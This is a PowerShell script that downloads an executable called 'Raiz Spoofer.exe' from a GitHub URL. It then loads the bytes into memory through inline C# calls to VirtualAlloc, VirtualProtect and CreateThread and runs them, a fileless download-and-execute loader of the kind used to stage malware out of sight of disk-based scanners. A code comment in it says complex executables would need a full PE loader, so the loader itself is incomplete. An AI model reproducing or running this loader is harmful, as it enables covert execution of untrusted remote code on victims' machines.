$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"

$code = @"
using System;
using System.Runtime.InteropServices;

public class L {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public static void Run(byte[] b) {
        // This is a simplified Shellcode-style loader for Native C++
        // Note: For complex C++ EXEs, a full PE Loader is required.
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);
        Marshal.Copy(b, 0, p, b.Length);
        uint old;
        VirtualProtect(p, (uint)b.Length, 0x20, out old);
        IntPtr h = CreateThread(IntPtr.Zero, 0, p, IntPtr.Zero, 0, out old);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
"@

try {
    Write-Host "[*] Downloading C++ Binary..." -ForegroundColor Cyan
    $data = (New-Object System.Net.WebClient).DownloadData($url)
    
    Write-Host "[*] Injecting Native Code into Memory..." -ForegroundColor Cyan
    Add-Type -TypeDefinition $code
    [L]::Run($data)
    
    Write-Host "[+] Native Execution Started!" -ForegroundColor Green
} catch {
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
}
